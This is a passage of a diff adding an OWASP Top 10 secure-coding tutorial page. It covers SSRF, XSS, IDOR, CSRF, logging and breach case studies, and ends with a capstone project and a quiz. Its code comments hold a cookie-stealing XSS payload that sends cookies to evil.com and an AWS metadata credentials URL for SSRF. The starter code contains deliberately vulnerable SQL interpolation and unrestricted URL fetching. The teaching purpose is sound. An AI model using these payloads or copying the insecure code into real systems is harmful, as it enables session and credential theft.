+    return json.loads(payload)</code></pre>
+      </div>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1">
+       <li>
+        Never deserialize untrusted data with pickle, eval, or similar mechanisms.
+       </li>
+       <li>
+        Sign and verify all software updates, Docker images, and config artifacts.
+       </li>
+       <li>
+        Use SRI (subresource integrity) hashes for CDN-loaded JavaScript.
+       </li>
+       <li>
+        Review CI/CD pipeline permissions and require signed commits for releases.
+       </li>
+      </ul>
+     </section>
+     <section class="mb-16" id="logging-failures">
+      <h2 class="text-2xl font-bold mb-4">
+       A09: Logging &amp; Monitoring Failures
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       Without good logs, a breach can continue for months. This category covers missing logs, logs that leak secrets,
+              and teams that do not act on alerts.
+      </p>
+      <div class="p-4 rounded-xl bg-[var(--panel)] border border-[var(--border)] mb-4">
+       <p class="text-sm font-semibold mb-2">
+        Real-world example
+       </p>
+       <p class="text-sm text-[var(--muted)]">
+        Marriott's 2018 breach lasted four years before discovery. Attackers had been inside the Starwood systems since
+                2014 because security monitoring and incident response were inadequate.
+       </p>
+      </div>
+      <p class="font-semibold mb-2">
+       What to log (and not log)
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ✅ SECURE structured logging example
+const winston = require("winston");
+const logger = winston.createLogger({
+  level: "info",
+  format: winston.format.json(),
+  transports: [new winston.transports.Console()],
+});
+function logLogin(email, success, ip) {
+  logger.info({
+    event: "login_attempt",
+    user: email,
+    success,
+    ip,
+    timestamp: new Date().toISOString(),
+    // ❌ Never log req.body.password here
+  });
+}</code></pre>
+      </div>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1">
+       <li>
+        Log authentication, authorization, data changes, and admin actions.
+       </li>
+       <li>
+        Never log passwords, tokens, credit cards, or full PII.
+       </li>
+       <li>
+        Forward logs to a central SIEM and set alerts on anomalies.
+       </li>
+       <li>
+        Practice incident response drills so teams know the playbook.
+       </li>
+      </ul>
+     </section>
+     <section class="mb-16" id="ssrf">
+      <h2 class="text-2xl font-bold mb-4">
+       A10: Server-Side Request Forgery (SSRF)
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       SSRF happens when a server makes an HTTP request to a URL supplied by a user, and the attacker uses that
+              capability to reach internal services, cloud metadata endpoints, or restricted networks.
+      </p>
+      <div class="p-4 rounded-xl bg-[var(--panel)] border border-[var(--border)] mb-4">
+       <p class="text-sm font-semibold mb-2">
+        Real-world example
+       </p>
+       <p class="text-sm text-[var(--muted)]">
+        The 2019 Capital One breach is one of the largest SSRF cases: a misconfigured WAF let the attacker request
+                AWS metadata service URLs, obtain IAM credentials, and list S3 buckets containing 100 million customer records.
+       </p>
+      </div>
+      <p class="font-semibold mb-2">
+       Vulnerable URL fetch
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ❌ VULNERABLE: fetch any URL the user provides
+app.post("/api/fetch-metadata", async (req, res) =&gt; {
+  const { url } = req.body;
+  const response = await fetch(url);
+  const text = await response.text();
+  res.json({ data: text });
+});
+// Attacker sends url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre>
+      </div>
+      <p class="font-semibold mb-2">
+       Safe URL fetch with allow-list and DNS resolution check
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ✅ SECURE
+const { URL } = require("url");
+const dns = require("dns").promises;
+const ALLOWED_HOSTS = ["api.example.com", "hooks.example.com"];
+async function safeFetch(userUrl) {
+  let parsed;
+  try {
+    parsed = new URL(userUrl);
+  } catch {
+    throw new Error("Invalid URL");
+  }
+  if (!["http:", "https:"].includes(parsed.protocol)) {
+    throw new Error("Protocol not allowed");
+  }
+  if (!ALLOWED_HOSTS.includes(parsed.hostname)) {
+    throw new Error("Host not allowed");
+  }
+  const addresses = await dns.resolve(parsed.hostname);
+  for (const ip of addresses) {
+    if (isPrivateIP(ip)) throw new Error("Private IP blocked");
+  }
+  return fetch(userUrl);
+}</code></pre>
+      </div>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1">
+       <li>
+        Use strict allow-lists for outbound URLs, not blocklists.
+       </li>
+       <li>
+        Block private IP ranges and cloud metadata endpoints.
+       </li>
+       <li>
+        Run fetch services in isolated networks with no access to internal APIs.
+       </li>
+       <li>
+        Disable unused URL fetching features.
+       </li>
+      </ul>
+     </section>
+     <section class="mb-16" id="ssdlc">
+      <h2 class="text-2xl font-bold mb-4">
+       Secure SDLC Habits
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       Treating security as a final checklist guarantees repeated breaches. The best teams embed security into every
+              phase of the software development lifecycle (SDLC).
+      </p>
+      <div class="grid sm:grid-cols-2 gap-4 mb-6">
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         Requirements
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         Define what must be protected: PII, payment data, admin functions, third-party integrations.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         Design
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         Threat model with STRIDE. Draw trust boundaries. Ask "what if an attacker controls the client?"
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         Code
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         Use safe APIs, linters (eslint-security, bandit), code review checklists, and pair reviews for risky changes.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         Test
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         SAST, DAST, dependency scanning, fuzzing, and OWASP ZAP baseline scans in CI.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         Deploy
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         Sign artifacts, scan images, rotate secrets, and enforce security headers and TLS.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         Operate
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         Centralized logging, anomaly alerts, incident response playbooks, and regular penetration tests.
+        </p>
+       </div>
+      </div>
+     </section>
+     <section class="mb-16" id="more-real-world">
+      <h2 class="text-2xl font-bold mb-4">
+       More Real-World Breaches by Risk
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-6">
+       OWASP categories are not abstract checkboxes &mdash; they appear in headline breaches repeatedly.
+            Studying real cases helps you recognize the same patterns in your own code and infrastructure.
+      </p>
+      <div class="grid sm:grid-cols-2 gap-4 mb-6">
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         A01: Uber (2016)
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         Attackers found credentials in a private GitHub repo, then used them to access an internal AWS dashboard without proper access controls, exposing 57 million users.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         A02: LinkedIn (2012)
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         167 million password hashes were stolen. Because SHA1 without salt was used, attackers cracked millions within hours and sold the list online.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         A03: TalkTalk (2015)
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         A simple SQL injection in a legacy webpage gave attackers access to 157,000 customer records and cost the company &pound;77 million.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         A04: First American Financial (2019)
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         Insecure direct object reference in a document viewer let anyone change a numeric ID to view 885 million sensitive financial records.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         A05: Microsoft Power Apps (2021)
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         Misconfigured OData APIs exposed 38 million records from government agencies and private companies because default sharing settings were too permissive.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         A06: Log4Shell (CVE-2021-44228)
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         A single vulnerable Log4j logging call in millions of Java applications allowed remote code execution worldwide within days of disclosure.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         A07: Yahoo (2013&ndash;2014)
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         Weak hashing (MD5) and no MFA for internal accounts contributed to the compromise of 3 billion accounts, reducing Yahoo's sale price by $350 million.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         A08: Codecov Bash Uploader (2021)
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         Attackers compromised a CI script used by thousands of companies. Because the script was not signed, malicious code was distributed for two months.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         A09: Target (2013)
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         Alert tools detected the breach but were ignored because of alert fatigue. 40 million credit cards were stolen before the intrusion was contained.
+        </p>
+       </div>
+       <div class="p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]">
+        <h3 class="font-bold mb-2">
+         A10: Capital One (2019)
+        </h3>
+        <p class="text-sm text-[var(--muted)]">
+         SSRF through a misconfigured WAF allowed access to AWS IAM credentials, leading to the theft of 100 million customer records.
+        </p>
+       </div>
+      </div>
+     </section>
+     <section class="mb-16" id="extra-risks">
+      <h2 class="text-2xl font-bold mb-4">
+       Risks Beyond the Top 10
+      </h2>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       The OWASP Top 10 is a starting point, not a complete catalog. Production systems also face these threats:
+      </p>
+      <h3 class="text-lg font-semibold mb-2">
+       Cross-Site Scripting (XSS)
+      </h3>
+      <p class="text-[var(--muted)] leading-relaxed mb-2">
+       XSS allows attackers to inject JavaScript into pages other users view. Stored XSS led to the 2018 British Airways breach where attackers skimmed 380,000 payment cards through a compromised script.
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ❌ VULNERABLE: reflects user input without escaping
+app.get("/search", (req, res) =&gt; {
+  res.send(`Results for: ${req.query.q}`);
+});
+// Attacker sends: q=fetch('https://evil.com?cookie='+document.cookie)
+// ✅ SECURE: escape output or use a framework that auto-escapes
+const escapeHtml = require("escape-html");
+app.get("/search", (req, res) =&gt; {
+  res.send(`Results for: ${escapeHtml(req.query.q)}`);
+});</code></pre>
+      </div>
+      <h3 class="text-lg font-semibold mb-2">
+       Cross-Site Request Forgery (CSRF)
+      </h3>
+      <p class="text-[var(--muted)] leading-relaxed mb-2">
+       CSRF tricks a logged-in user's browser into performing unwanted actions. A 2008 uTorrent CSRF flaw let attackers change settings by getting users to visit a malicious page.
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ✅ SECURE: csurf middleware + SameSite cookies
+const csrf = require("csurf");
+const csrfProtection = csrf({ cookie: { httpOnly: true, sameSite: "strict" } });
+app.post("/api/transfer", csrfProtection, authenticate, (req, res) =&gt; {
+  // process transfer
+});</code></pre>
+      </div>
+      <h3 class="text-lg font-semibold mb-2">
+       Insecure Direct Object References (IDOR)
+      </h3>
+      <p class="text-[var(--muted)] leading-relaxed mb-2">
+       IDOR is a specific access-control failure where an attacker manipulates a reference (invoice ID, file path, user ID) to access unauthorized resources. It featured in the 2019 First American Financial breach.
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-python"># ❌ VULNERABLE: /api/documents/123 -&gt; attacker tries /api/documents/124
+@app.get("/api/documents/{doc_id}")
+def get_document(doc_id: int):
+    return db.get_document(doc_id)
+# ✅ SECURE: check ownership
+def get_document(user: User, doc_id: int):
+    doc = db.query(
+        "SELECT * FROM documents WHERE id = ? AND owner_id = ?", (doc_id, user.id)
+    )
+    if not doc:
+        raise HTTPException(status_code=404)
+    return doc</code></pre>
+      </div>
+      <h3 class="text-lg font-semibold mb-2">
+       Business Logic Flaws
+      </h3>
+      <p class="text-[var(--muted)] leading-relaxed mb-2">
+       Business logic flaws let attackers abuse legitimate workflows. In 2016, Uber had a flaw that let users book rides with a negative payment method, effectively earning money from the company.
+      </p>
+      <h3 class="text-lg font-semibold mb-2">
+       API Security
+      </h3>
+      <p class="text-[var(--muted)] leading-relaxed mb-2">
+       APIs often expose more data than web pages because they are not visually constrained. The 2018 T-Mobile API breach exposed personal data of 2 million customers through an unauthenticated endpoint.
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// ✅ SECURE: enforce auth, rate limits, and response filtering on every API route
+app.use("/api", authenticate);
+app.use("/api", rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));
+app.get("/api/users/:id", async (req, res) =&gt; {
+  const user = await db.findById(req.params.id);
+  res.json({
+    id: user.id,
+    name: user.name,
+    // ❌ Do not return: email, ssn, password_hash, internal_notes
+  });
+});</code></pre>
+      </div>
+      <h3 class="text-lg font-semibold mb-2">
+       Secrets in Source Code
+      </h3>
+      <p class="text-[var(--muted)] leading-relaxed mb-2">
+       Hard-coded API keys and database passwords are found in public repositories daily. GitHub scans for leaked secrets, but prevention is better than detection.
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-bash"># ✅ SECURE secrets management
+# Use environment variables, never commit keys
+export DATABASE_URL="$(aws secretsmanager get-secret-value --secret-id prod/db)"
+# Scan for secrets before pushing
+git-secrets --scan
+pre-commit run --all-files
+</code></pre>
+      </div>
+     </section>
+     <section class="mb-16" id="capstone">
+      <h2 class="text-2xl font-bold mb-4">
+       Capstone Project: Harden a Small E-Commerce API
+      </h2>
+      <h3 class="text-lg font-semibold mb-2">
+       1. What is this project?
+      </h3>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       You will take a deliberately insecure Node.js/Express e-commerce API and apply defenses for every OWASP Top 10
+            risk. The starter intentionally contains multiple vulnerabilities so you can practice finding and fixing them.
+      </p>
+      <h3 class="text-lg font-semibold mb-2">
+       2. What it covers
+      </h3>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1 mb-4">
+       <li>
+        Broken access control: enforce order ownership and admin RBAC.
+       </li>
+       <li>
+        Cryptographic failures: hash passwords, encrypt PII, enforce TLS, set secure cookies.
+       </li>
+       <li>
+        Injection: convert all raw SQL to parameterized queries; add input validation.
+       </li>
+       <li>
+        Insecure design: recalculate prices server-side, add inventory checks, and rate-limit checkout.
+       </li>
+       <li>
+        Security misconfiguration: Helmet headers, generic errors, non-root Docker user, minimal image.
+       </li>
+       <li>
+        Vulnerable components: audit dependencies, remove unused packages, add Dependabot.
+       </li>
+       <li>
+        Authentication failures: rate-limit login, add TOTP MFA, secure password reset.
+       </li>
+       <li>
+        Integrity failures: sign session cookies with HMAC, verify Docker image digests, SRI for CDN assets.
+       </li>
+       <li>
+        Logging failures: structured JSON logs, SIEM forwarding, redact secrets, alert thresholds.
+       </li>
+       <li>
+        SSRF: block metadata endpoints, restrict outbound webhooks to an allow-list, DNS resolution checks.
+       </li>
+      </ul>
+      <h3 class="text-lg font-semibold mb-2">
+       3. How it is done
+      </h3>
+      <p class="text-[var(--muted)] leading-relaxed mb-2">
+       Project structure:
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-bash">owasp-capstone/
+&boxvr;&boxh;&boxh; Dockerfile
+&boxvr;&boxh;&boxh; docker-compose.yml
+&boxvr;&boxh;&boxh; package.json
+&boxvr;&boxh;&boxh; src/
+&boxv;   &boxvr;&boxh;&boxh; server.js          # intentionally insecure starter
+&boxv;   &boxvr;&boxh;&boxh; routes/
+&boxv;   &boxv;   &boxvr;&boxh;&boxh; auth.js
+&boxv;   &boxv;   &boxvr;&boxh;&boxh; orders.js
+&boxv;   &boxv;   &boxvr;&boxh;&boxh; checkout.js
+&boxv;   &boxv;   &boxur;&boxh;&boxh; webhooks.js
+&boxv;   &boxvr;&boxh;&boxh; middleware/
+&boxv;   &boxv;   &boxvr;&boxh;&boxh; auth.js
+&boxv;   &boxv;   &boxvr;&boxh;&boxh; rateLimiters.js
+&boxv;   &boxv;   &boxur;&boxh;&boxh; errorHandler.js
+&boxv;   &boxvr;&boxh;&boxh; db.js
+&boxv;   &boxur;&boxh;&boxh; logger.js
+&boxur;&boxh;&boxh; tests/
+    &boxvr;&boxh;&boxh; access-control.test.js
+    &boxvr;&boxh;&boxh; injection.test.js
+    &boxvr;&boxh;&boxh; ssrf.test.js
+    &boxur;&boxh;&boxh; crypto.test.js
+</code></pre>
+      </div>
+      <p class="text-[var(--muted)] leading-relaxed mb-2">
+       Step 1 &mdash; start from the vulnerable starter:
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// src/server.js &mdash; intentionally insecure
+const express = require("express");
+const app = express();
+app.use(express.json());
+app.get("/api/orders/:id", async (req, res) =&gt; {
+  const order = await db.query(
+    `SELECT * FROM orders WHERE id = ${req.params.id}`,
+  );
+  res.json(order.rows[0]);
+});
+app.post("/api/checkout", (req, res) =&gt; {
+  chargeCard(req.user.card, req.body.total);
+  res.json({ ok: true });
+});
+app.post("/api/webhooks/fetch", async (req, res) =&gt; {
+  const response = await fetch(req.body.url);
+  res.json({ body: await response.text() });
+});
+app.listen(3000);</code></pre>
+      </div>
+      <p class="text-[var(--muted)] leading-relaxed mb-2">
+       Step 2 &mdash; apply security hardening in this order:
+      </p>
+      <ol class="list-decimal pl-5 text-[var(--muted)] space-y-1 mb-4">
+       <li>
+        Add Helmet, CORS, and a generic error handler that hides stack traces.
+       </li>
+       <li>
+        Replace every string-interpolated query with parameter binding.
+       </li>
+       <li>
+        Enforce order ownership in the database WHERE clause and add an admin-only middleware.
+       </li>
+       <li>
+        Re-calculate cart totals from a trusted price catalog; reject mismatches.
+       </li>
+       <li>
+        Add express-rate-limit on auth and checkout routes; require CAPTCHA after repeated failures.
+       </li>
+       <li>
+        Run npm audit, remove unused packages, pin exact versions, enable Dependabot.
+       </li>
+       <li>
+        Add bcrypt password hashing, TOTP MFA, secure httpOnly cookies, and password reset tokens.
+       </li>
+       <li>
+        Sign session cookies with HMAC; verify Docker image digests in CI; add SRI for CDN assets.
+       </li>
+       <li>
+        Add structured JSON logging and alert on failed admin logins, large money movements, and SSRF attempts.
+       </li>
+       <li>
+        Validate webhook URLs against an allow-list, resolve DNS, and block private IPs and metadata endpoints.
+       </li>
+      </ol>
+      <p class="text-[var(--muted)] leading-relaxed mb-2">
+       Step 3 &mdash; example test that must pass after hardening:
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-javascript">// tests/access-control.test.js
+const request = require("supertest");
+const app = require("../src/server");
+describe("access control", () =&gt; {
+  it("blocks users from viewing other users orders", async () =&gt; {
+    const alice = await login("alice@example.com", "password");
+    const res = await request(app)
+      .get("/api/orders/999") // order belonging to Bob
+      .set("Authorization", `Bearer ${alice.token}`);
+    expect(res.status).toBe(404);
+  });
+  it("rejects checkout when client total does not match server total", async () =&gt; {
+    const bob = await login("bob@example.com", "password");
+    const res = await request(app)
+      .post("/api/checkout")
+      .set("Authorization", `Bearer ${bob.token}`)
+      .send({ itemIds: [1, 2], clientTotal: 0.01 });
+    expect(res.status).toBe(400);
+  });
+});</code></pre>
+      </div>
+      <p class="text-[var(--muted)] leading-relaxed mb-2">
+       Step 4 &mdash; Docker and CI security:
+      </p>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-dockerfile"># Dockerfile
+FROM node:20-alpine
+RUN addgroup -g 1001 -S appgroup &amp;&amp;     adduser -u 1001 -S appuser -G appgroup
+WORKDIR /app
+COPY package*.json ./
+RUN npm ci --only=production &amp;&amp; npm audit --audit-level=moderate
+COPY --chown=appuser:appgroup . .
+USER appuser
+EXPOSE 3000
+CMD ["node", "src/server.js"]</code></pre>
+      </div>
+      <div class="code-block mb-6">
+       <button class="copy-btn" onclick="copyCode(this)">
+        Copy
+       </button>
+       <pre><code class="language-yaml"># .github/workflows/ci.yml
+name: CI + Security
+on: [push, pull_request]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - run: npm ci
+      - run: npm audit --audit-level=moderate
+      - run: npm test
+      - uses: github/codeql-action/init@v3
+      - uses: github/codeql-action/analyze@v3</code></pre>
+      </div>
+      <h3 class="text-lg font-semibold mb-2">
+       4. What did we learn from this capstone project?
+      </h3>
+      <p class="text-[var(--muted)] leading-relaxed mb-4">
+       Security is not a single feature; it is a property of the whole system. One missing check in an access-control
+            rule, one unparameterized query, or one unvalidated URL can undermine months of good engineering. The capstone
+            shows how the OWASP Top 10 risks interconnect in a real application and how defenses reinforce each other.
+            Fixing one category often helps another: parameterized queries prevent injection and reduce the blast radius of
+            access-control mistakes; logging makes misconfigurations and attacks visible; and CI scanning keeps vulnerable
+            components from reaching production.
+      </p>
+      <h3 class="text-lg font-semibold mb-2">
+       5. How can I enhance this project in the future?
+      </h3>
+      <ul class="list-disc pl-5 text-[var(--muted)] space-y-1">
+       <li>
+        Add OWASP ZAP automated baseline scans in GitHub Actions and fail the build on new alerts.
+       </li>
+       <li>
+        Implement WebAuthn/Passkey authentication instead of passwords.
+       </li>
+       <li>
+        Add a bug-bounty-style capture-the-flag challenge with hidden flags for each risk.
+       </li>
+       <li>
+        Build a security dashboard that visualizes failed logins, dependency CVEs, and alert trends.
+       </li>
+       <li>
+        Integrate with an open-source SIEM (Wazuh or Elastic SIEM) and write detection rules.
+       </li>
+       <li>
+        Add a CSP report-uri endpoint and review violation reports weekly.
+       </li>
+       <li>
+        Run a tabletop incident-response exercise using the logs from this app.
+       </li>
+      </ul>
+     </section>
+     <section class="mb-16" id="quiz">
+      <h2 class="text-2xl font-bold mb-4">
+       Knowledge Check
+      </h2>
+      <div class="space-y-5">
+       <div class="quiz-card border border-[var(--border)] rounded-xl p-4 bg-[var(--panel)]">
+        <p class="font-semibold mb-3">
+         1. A user changes the order ID in a URL and sees another user's order. Which OWASP risk is this?
+        </p>
+        <div class="space-y-2">
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition" data-correct="true">
+          A01 Broken Access Control
+         </button>
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+          A03 Injection
+         </button>
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+          A07 Authentication Failures
+         </button>
+        </div>
+       </div>
+       <div class="quiz-card border border-[var(--border)] rounded-xl p-4 bg-[var(--panel)]">
+        <p class="font-semibold mb-3">
+         2. Which defense best prevents SQL injection?
+        </p>
+        <div class="space-y-2">
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+          Escaping single quotes manually in JavaScript
+         </button>
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition" data-correct="true">
+          Parameterized queries / prepared statements
+         </button>
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+          Validating input on the client only
+         </button>
+        </div>
+       </div>
+       <div class="quiz-card border border-[var(--border)] rounded-xl p-4 bg-[var(--panel)]">
+        <p class="font-semibold mb-3">
+         3. The SolarWinds breach is the classic example of which risk?
+        </p>
+        <div class="space-y-2">
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+          A05 Security Misconfiguration
+         </button>
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition" data-correct="true">
+          A08 Software &amp; Data Integrity Failures
+         </button>
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+          A10 SSRF
+         </button>
+        </div>
+       </div>
+       <div class="quiz-card border border-[var(--border)] rounded-xl p-4 bg-[var(--panel)]">
+        <p class="font-semibold mb-3">
+         4. What is the safest approach when a server must fetch a URL supplied by a user?
+        </p>
+        <div class="space-y-2">
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+          Block common internal hostnames like localhost
+         </button>
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition" data-correct="true">
+          Strict allow-list of hostnames + DNS resolution check for private IPs
+         </button>
+         <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+          Use HTTPS only and log the URL
+         </button>
+        </div>
+       </div>
+      </div>
+      <div class="quiz-card border border-[var(--border)] rounded-xl p-4 bg-[var(--panel)]">
+       <p class="font-semibold mb-3">
+        5. Which breach is the best-known example of a supply-chain integrity failure?
+       </p>
+       <div class="space-y-2">
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+         Heartland Payment Systems
+        </button>
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition" data-correct="true">
+         SolarWinds Orion
+        </button>
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+         British Airways XSS
+        </button>
+       </div>
+      </div>
+      <div class="quiz-card border border-[var(--border)] rounded-xl p-4 bg-[var(--panel)]">
+       <p class="font-semibold mb-3">
+        6. What is the safest way to render user input in an HTML page?
+       </p>
+       <div class="space-y-2">
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+         Insert it directly into innerHTML after client-side validation
+        </button>
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition" data-correct="true">
+         Escape HTML entities or use a framework that auto-escapes
+        </button>
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+         Sanitize with a regular expression for &lt;script&gt; tags only
+        </button>
+       </div>
+      </div>
+      <div class="quiz-card border border-[var(--border)] rounded-xl p-4 bg-[var(--panel)]">
+       <p class="font-semibold mb-3">
+        7. IDOR is a type of which broader OWASP category?
+       </p>
+       <div class="space-y-2">
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition" data-correct="true">
+         Broken Access Control (A01)
+        </button>
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+         Injection (A03)
+        </button>
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+         Insecure Design (A04)
+        </button>
+       </div>
+      </div>
+      <div class="quiz-card border border-[var(--border)] rounded-xl p-4 bg-[var(--panel)]">
+       <p class="font-semibold mb-3">
+        8. Which defense best reduces the impact of a vulnerable dependency?
+       </p>
+       <div class="space-y-2">
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+         Write custom wrapper functions around every library call
+        </button>
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition" data-correct="true">
+         Patch quickly, remove unused dependencies, and scan in CI
+        </button>
+        <button class="quiz-opt w-full text-left px-4 py-3 rounded-lg border border-[var(--border)] hover:border-[var(--brand-light)] transition">
+         Store a local copy of every package in the repo
+        </button>
+       </div>
+      </div>
+      <div class="mt-6 hidden p-4 rounded-xl border border-[var(--border)] bg-[var(--panel)]" id="quiz-summary">
+       <p class="font-bold">
+       </p>
+      </div>
+     </section>
+    </main>
+   </div>
+  </div>
+  <script>
+   const html = document.documentElement;
+      const moon = document.getElementById('moon');
+      const sun = document.getElementById('sun');
+      function applyTheme(theme) {
+        html.classList.remove('light', 'dark');
+        html.classList.add(theme);
+        const lightLink = document.getElementById('hljs-light');
